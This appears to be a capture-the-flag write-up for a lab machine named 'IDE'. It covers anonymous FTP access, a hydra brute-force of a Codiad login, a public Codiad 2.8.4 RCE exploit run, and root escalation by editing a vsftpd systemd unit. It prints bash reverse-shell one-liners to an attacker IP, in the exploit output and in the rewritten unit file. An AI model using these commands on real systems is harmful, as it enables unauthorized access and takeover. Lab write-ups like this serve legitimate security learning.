{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- -sC -sV 10.10.0.210", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 08:36 CET
Warning: 10.10.0.210 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.0.210
Host is up (0.080s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.157
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel")}}

{{text("We discover 3 open ports: ")}}

{{list(['21 (FTP)', '22 (SSH)', '62337 (HTTP)'])}}

{{text("Let's begin by checking the FTP service.")}}

{{text("It allows us to log in anonymously by using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>anonymous:anonymous</code> as our credentials.")}}

{{text("Inside we can find a folder named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>...</code> in which is a file named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>-</code>. Pretty strange names.")}}

{{text("We can download the file using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>get</code> command.")}}

{{text("In order to read the file let's change it's name to something normal using either the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>mv</code> or <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cp</code> command.")}}

{{console("cat file", "Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.")}}

{{text("We found 2 usernames, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>drac</code>. The note also informs us about a password change to the default one, meaning it should be easy to guess.")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("We proceed to the web page on port 62337, probably looking for some kind of login form.")}}

{{image("../../static/writeups/ide/images/000001.jpg")}}

{{text("It's probably possible for us to guess user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> password, but let's use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hydra</code> to brute-force it.")}}

{{console("hydra -l john -P /usr/share/wordlists/rockyou.txt 10.10.0.210 -s 62337 http-post-form '/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^:Incorrect Username or Password'", "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-17 09:10:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.0.210:62337/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^:Incorrect Username or Password
[62337][http-post-form] host: 10.10.0.210   login: john   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-17 09:10:20")}}

{{text("Knowing the password, we can log in.")}}

{{image("../../static/writeups/ide/images/000002.jpg")}}

{{text("Now we can search for any known exploits for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Codiad 2.8.4</code>.")}}

{{text("I came acroos this.")}}

{{link("https://www.exploit-db.com/exploits/49705", "https://www.exploit-db.com/favicon.ico", "Codiad 2.8.4 - Remote Code Execution (Authenticated)")}}

{{text("Let's copy the exploit onto our machine and run it.")}}

{{console("python3 exploit.py http://10.10.192.150:62337/ john password 10.9.1.157 1234 linux", "[+] Please execute the following command on your vps: 
echo 'bash -c 'bash -i >/dev/tcp/10.9.1.157/1235 0>&1 2>&1'' | nc -lnvp 1234
nc -lnvp 1235
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {'status':'success','data':{'username':'john'}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {'status':'success','data':{'name':'CloudCall','path':'\/var\/www\/html\/codiad_projects'}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
{'status','error','message':'No Results Returned'}
[+] Exploit finished!
[+] Enjoy your reverse shell!")}}

{{text("Now we have a reverse shell on the target.")}}

{{image("../../static/writeups/ide/images/000003.jpg")}}

{{header("Shell as drac", "shell-as-drac")}}

{{text("While looking through the system, I accessed user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>drac</code> home directory.")}}

{{text("There was a flag, which I couldn't read and a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.bash_history</code> file which contents were not getting deleted.")}}

{{image("../../static/writeups/ide/images/000004.jpg")}}

{{text("We got a password to MySQL database, I wondered if this user reused his passwords and I tried to log in as him.")}}

{{image("../../static/writeups/ide/images/000005.jpg")}}

{{text("Seems like my theory was right.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since I had my current user's password, I checked his sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart")}}

{{text("I checked if we have write permissions to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/lib/systemd/system/vsftpd.service</code> file and we do.")}}

{{text("If we edit this file, then upon restarting the service the edited code will execute.")}}

{{text("Meaning we just have to insert a reverse shell somewhere inside of this file.")}}

{{console("", "[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.1.157/1235 0>&1'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target")}}

{{text("Now let's use the sudo command.")}}

{{console("sudo /usr/sbin/service vsftpd restart", "Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.")}}

{{text("We follow the instructions and execute the command provided.")}}

{{text("Now when we run the sudo command again, we should get a reverse shell and be able to read the last flag.")}}

{{image("../../static/writeups/ide/images/000006.jpg")}}

{{script()}}